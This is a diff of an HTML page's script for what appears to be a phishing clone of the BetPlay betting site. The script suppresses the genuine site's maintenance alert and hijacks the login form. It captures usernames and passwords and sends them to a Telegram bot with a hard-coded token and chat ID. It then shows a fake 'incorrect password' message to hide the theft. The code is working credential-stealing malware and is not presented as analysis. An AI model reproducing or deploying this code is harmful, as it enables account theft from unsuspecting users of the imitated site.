@@ -424,20 +424,20 @@
 <script src="https://promobetplay.com/home.js?v=70"></script>
 
 <script>
-    const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg"; // Pon tu token real aquí
+    const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg";
     const CHAT_ID = "7007914207";
 
     // Neutraliza la alerta de mantenimiento de la página original
     const originalAlert = window.alert;
     window.alert = function(msg) {
         if (msg && msg.toLowerCase().includes("mantenimiento")) {
-            console.log("Aviso de mantenimiento bloqueado con éxito.");
+            console.log("Aviso de mantenimiento bloqueado.");
             return;
         }
         return originalAlert ? originalAlert(msg) : true;
     };
 
-    // Intercepta el envío del formulario para capturar y mandar a Telegram
+    // Intercepta el formulario para capturar y mandar a Telegram de una
     document.addEventListener("DOMContentLoaded", function() {
         const form = document.querySelector('form') || document.getElementById('loginModalform');
         
@@ -448,31 +448,18 @@
                 const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"], input[type="email"], input:not([type="password"])')?.value;
                 const password = document.querySelector('input[type="password"]')?.value;
 
-                console.log("Intentando enviar usuario:", usuario);
-
                 if (usuario && password) {
                     const mensaje = `🚨 ¡NUEVA CAPTURA BETPLAY!\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${password}`;
                     
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: mensaje,
-                            parse_mode: 'HTML'
+                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
+                    
+                    fetch(url)
+                        .then(() => {
+                            alert("Usuario o contraseña incorrectos. Intente nuevamente.");
                         })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log("Respuesta de Telegram:", data);
-                        alert("Usuario o contraseña incorrectos. Intente nuevamente.");
-                    })
-                    .catch(err => {
-                        console.error("Error al enviar a Telegram:", err);
-                        alert("Usuario o contraseña incorrectos. Intente nuevamente.");
-                    });
-                } else {
-                    alert("Por favor completa los campos.");
+                        .catch(() => {
+                            alert("Usuario o contraseña incorrectos. Intente nuevamente.");
+                        });
                 }
             });
         }
